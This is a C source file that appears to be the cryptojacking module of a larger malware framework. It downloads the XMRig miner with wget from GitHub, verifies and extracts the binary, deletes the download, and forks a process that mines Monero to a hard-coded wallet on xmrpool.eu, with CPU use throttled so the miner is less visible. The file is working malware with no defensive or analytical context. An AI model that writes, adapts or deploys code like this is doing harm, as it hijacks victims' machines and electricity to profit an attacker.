#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <libgen.h>
#include <sys/stat.h>

#define HASH_LEN 65 // 64 characters for hash + 1 null terminator

#include "xmr.h"

int fetch_xmrig(char *download_path) {
    char template[] = "wget -O %s https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz";
    char command[256];
    global->snprintf(command, sizeof(command), template, download_path);
    int ret = global->system(command);
    if (ret != 0) {
        DEBUG_LOG_ERR("[XMR] fail wget to get xmr binary\n");
        return -1;
    }
    
    return 0;
}

int calculate_sha256(const char *file_path, char *output) {
    char command[256];
    global->snprintf(command, sizeof(command), "sha256sum %s", file_path);

    FILE *pipe = global->popen(command, "r");
    if (!pipe) {
        DEBUG_LOG_ERR("[XMR] fail file open download hash\n");
        return -1;
    }

    if (global->fgets(output, HASH_LEN, pipe) == NULL) {
        global->pclose(pipe);
        DEBUG_LOG_ERR("[XMR] failed to read download hash\n");
        return -1;
    }

    global->pclose(pipe);

    output[HASH_LEN - 1] = '\0';

    return 0;
}

int download_retries_xmrig(char *download_path) {
    fetch_xmrig(download_path);

    // hash from official download
    const char valid_hash[] = "b2c88b19699e3d22c4db0d589f155bb89efbd646ecf9ad182ad126763723f4b7";

    int max_reattempts = 3;
    int i = 0;
    int ret = -1;
    char got_hash[HASH_LEN];
    calculate_sha256(download_path, got_hash);

    //best-effort, some retries, nothing happens if hash never matches
    if (global->strncmp(valid_hash, got_hash, HASH_LEN) != 0) {
        while (i < max_reattempts && ret != 0) {
            fetch_xmrig(download_path);
            ret = calculate_sha256(download_path, got_hash);
            if (global->strncmp(valid_hash, got_hash, HASH_LEN) == 0) {
                break;
            }
            i++;
        }
    }
    return 0;
}

int copy_file(const char *src, const char *dest) {
    FILE *src_file = global->fopen(src, "rb");
    if (src_file == NULL) {
        DEBUG_LOG_ERR("[XMR] fail opening source file\n");
        return -1;
    }

    FILE *dest_file = global->fopen(dest, "wb");
    if (dest_file == NULL) {
        DEBUG_LOG_ERR("[XMR] fail opening dest file\n");
        global->fclose(src_file);
        return -1;
    }

    char buffer[4096];
    size_t bytes_read;

    while ((bytes_read = global->fread(buffer, 1, sizeof(buffer), src_file)) > 0) {
        if (global->fwrite(buffer, 1, bytes_read, dest_file) != bytes_read) {
            DEBUG_LOG_ERR("[XMR] fail writing to destination file\n");
            global->fclose(src_file);
            global->fclose(dest_file);
            return -1;
        }
    }

    if (global->ferror(src_file)) {
        DEBUG_LOG_ERR("[XMR] fail reading from source file\n");
        global->fclose(src_file);
        global->fclose(dest_file);
        return -1;
    }

    global->fclose(src_file);
    global->fclose(dest_file);

    return 0;
}

int delete_file(char *path) {
    return global->remove(path);
}

int extract_xmrig_runner(char *srcPath, char *destPath) {
    char *destDir = global->dirname(global->strdup(destPath));
    char command[256];
    global->chmod(srcPath, 0777);
    global->snprintf(command, sizeof(command), "tar -xf %s xmrig-6.22.2/xmrig -C %s --strip-components 1", srcPath, destDir);

    if (global->system(command) < 0) {
        global->free(destDir);
        DEBUG_LOG_ERR("[XMR] fail extracting xmr\n");
        return -1;
    }
    global->free(destDir);

    if (copy_file("/var/tmp/xmrig", destPath) < 0) {
        DEBUG_LOG_ERR("[XMR] fail copy extracted file\n");
        return -1;
    }

    if (delete_file("/var/tmp/xmrig") < 0) {
        DEBUG_LOG_ERR("[XMR] delete xmr exec in source path fail\n");
        return -1;
    }

    if (global->chmod(destPath, 0755) < 0) {
        DEBUG_LOG_ERR("[XMR] fail chmod +x xmr exec\n");
        return -1;
    }
    
    return 0;
}

int money(char *exec_path) {
    // fork and run exploit;
    int pid = global->fork();
    CHECK(pid == -1);

    if (pid == 0) {
      DEBUG_LOG("[XMR] Crypto-Miner running in forked process\n");
      if (global->execlp(
              exec_path, 
              exec_path, 
              "--url", 
              "xmrpool.eu:5555", 
              "--user",
              "4ARVkbE25vnbMyEMRhUpXKdn2ThNk1YPhdvtwYyui96bR4mMRqnQ5JT13iAgqzsz"
              "GJ4THiD2DV1So7UADuEtdnia5DNq53q",
              "--pass", 
              "x", 
              "--rig-id", 
              "test", 
              "--coin", 
              "XMR",
              "--randomx-mode", 
              "auto", 
              "--donate-level=5", 
              "--title", 
              "--cpu",
              "--cpu-priority=1", 
              "--threads=1", 
              "--cpu-affinity=-1",
              "--cpu-max-threads-hint=1", 
              NULL) != 0) {
        DEBUG_LOG_ERR("[XMR] fail executing xmr binary\n");
      }
      return 0;
    }
}

// Main function for xmrig module
int xmrig(Globals * glob, int is_attacking) {
    global = glob;

    if(!is_attacking) {
        if (download_retries_xmrig(MONEY_DOWNLOAD_PATH) < 0) {
            DEBUG_LOG_ERR("[XMR] failed fetching\n");
            return -1;
        }
        global->sleep(1);
        if (extract_xmrig_runner(MONEY_DOWNLOAD_PATH, MONEY_EXECPATH) < 0) {
            DEBUG_LOG_ERR("[XMR] failed extracting\n");
            return -1;
        }

        if (delete_file(MONEY_DOWNLOAD_PATH) < 0) {
            DEBUG_LOG_ERR("[XMR] failed deleting, proceeding anyway\n");
        }
    }

    return money(MONEY_EXECPATH);
}
